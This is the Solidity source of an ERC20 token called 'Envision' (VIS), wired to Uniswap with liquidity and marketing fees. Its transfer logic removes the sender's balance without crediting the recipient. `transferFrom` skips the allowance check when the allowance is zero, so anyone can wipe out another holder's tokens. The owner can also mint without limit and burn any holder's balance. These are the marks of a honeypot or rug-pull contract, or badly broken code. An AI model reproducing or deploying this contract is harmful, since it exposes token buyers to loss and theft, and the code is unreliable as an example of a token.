// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./Address.sol";
import "./IChengFactory.sol";
import "./IChengRouter.sol";
import "./DividendDistributor.sol";



contract ChengToken is IERC20, Ownable {
    using Address for address;

    address REWARD = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address WETH = 0xc778417E063141139Fce010982780140Aa0cD5Ab; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address MARKETING = 0x7488D2d66BdaEf675FBcCc5266d44C6EB313a97b; 

    string constant _name = "Envision";
    string constant _symbol = "VIS";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 200000000 * (10 ** _decimals); // 200 M


    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    uint256 liquidityFee    = 5;
    uint256 burnFee   = 5;
    uint256 marketingFee    = 10;

    uint256 public totalFee = 20;
    uint256 feeDenominator  = 1000;

    address public autoLiquidityReceiver;
    address public marketingFeeReceiver; 


    IChengRouter public router;
    address public pair;


    DividendDistributor public distributor;
    uint256 distributorGas = 300000;
    
   
    bool inSwap;

    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {
        router = IChengRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //uniswap
        pair = IChengFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = uint256(0);

        distributor = new DividendDistributor(address(router));

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = MARKETING;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(0)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]-amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        _balances[sender] = _balances[sender]-amount;

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");      
        uint256 marketingFeeAmount = amount* marketingFee/feeDenominator; 
        uint256 LiquidityFeeAmount = amount* liquidityFee/feeDenominator; 

        _balances[sender] = _balances[sender] - amount - marketingFeeAmount - LiquidityFeeAmount;
        _balances[recipient] = _balances[recipient] + amount;
        _balances[marketingFeeReceiver] = _balances[marketingFeeReceiver] + marketingFeeAmount;
        _balances[autoLiquidityReceiver] = _balances[autoLiquidityReceiver] + LiquidityFeeAmount;

        emit Transfer(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function mintTo( address _to, uint _amount) public onlyOwner
    {
        require(_to != address(0), 'ERC20: to address is not valid');
        require(_amount > 0, 'ERC20: amount is not valid');

        _totalSupply = _totalSupply + _amount;
        _balances[_to] = _balances[_to] + _amount;
        
    }
    
    function burnFrom(address _from,uint _amount ) public  onlyOwner
    {
        require(_from != address(0), 'ERC20: from address is not valid');
        require(_balances[_from] >= _amount, 'ERC20: insufficient balance');
        
        _balances[_from] = _balances[_from] - _amount;
        _totalSupply = _totalSupply - _amount;

    }

    function getTotalFee(bool selling) public view returns (uint256) {       
        if(selling) { return totalFee+(1); } //tax sellers 1% more than buyers
        return totalFee;
    }

  

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount*(getTotalFee(receiver == pair))/(feeDenominator);

        _balances[address(this)] = _balances[address(this)]+(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount-(feeAmount);
    }

    
   
    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    
    function setFees(uint256 _liquidityFee, uint256 _burnFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee+(_burnFee)+(_marketingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/4);
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply-(balanceOf(DEAD))-(balanceOf(ZERO));
    }

    

    event AutoLiquify(uint256 amountREWARD, uint256 amountLIQ);    
    
}